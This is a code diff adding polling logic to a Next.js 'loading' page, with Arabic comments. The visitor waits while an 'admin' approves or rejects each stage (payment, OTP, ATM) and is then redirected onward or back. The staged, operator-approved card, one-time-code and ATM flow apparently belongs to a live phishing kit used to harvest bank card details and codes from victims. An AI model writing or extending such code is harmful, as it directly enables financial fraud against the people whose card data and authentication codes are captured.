@@ -1,12 +1,69 @@
 "use client";
 export const dynamic = 'force-dynamic';
+import { useEffect, useRef } from "react";
+import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
 
 const GREEN = "#1e7344";
 
 export default function LoadingPage() {
-  // لا يوجد redirect تلقائي - الصفحة تنتظر أمر الأدمين
-  // SessionTracker يتولى polling كل 30 ثانية ويعيد التوجيه حسب أمر الأدمين
+  const router = useRouter();
+  const searchParams = useSearchParams();
+  const from = searchParams.get("from") || "payment"; // payment | otp | atm
+  const pollingRef = useRef<NodeJS.Timeout | null>(null);
+
+  useEffect(() => {
+    // رسالة للأدمين بأن العميل في صفحة التحميل ينتظر
+    fetch('/api/session', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ current_page: 'loading-page', waiting_for: from }),
+    }).catch(() => {});
+
+    // Polling كل 3 ثوانٍ لانتظار قرار الأدمين
+    pollingRef.current = setInterval(async () => {
+      try {
+        const res = await fetch('/api/ping', { method: 'POST' });
+        const data = await res.json();
+        if (!data.ok) return;
+
+        const redirectTo = data.redirect_to;
+        const status = data.status;
+
+        // إذا كان هناك redirect محدد من الأدمين
+        if (redirectTo && redirectTo !== '/loading-page') {
+          clearInterval(pollingRef.current!);
+          router.push(redirectTo);
+          return;
+        }
+
+        // منطق القبول/الرفض حسب المرحلة
+        if (status === 'approved') {
+          clearInterval(pollingRef.current!);
+          if (from === 'payment') {
+            router.push('/otp');
+          } else if (from === 'otp') {
+            router.push('/atm');
+          } else if (from === 'atm') {
+            router.push('/success');
+          }
+        } else if (status === 'rejected') {
+          clearInterval(pollingRef.current!);
+          if (from === 'payment') {
+            router.push('/payment?rejected=1');
+          } else if (from === 'otp') {
+            router.push('/otp?rejected=1');
+          } else if (from === 'atm') {
+            router.push('/atm?rejected=1');
+          }
+        }
+      } catch {}
+    }, 3000);
+
+    return () => {
+      if (pollingRef.current) clearInterval(pollingRef.current);
+    };
+  }, [from, router]);
 
   return (
     <div style={{ backgroundColor: "#f7f8fa", display: "flex", justifyContent: "center", alignItems: "center", minHeight: "100vh", flexDirection: "column", padding: "20px" }}>
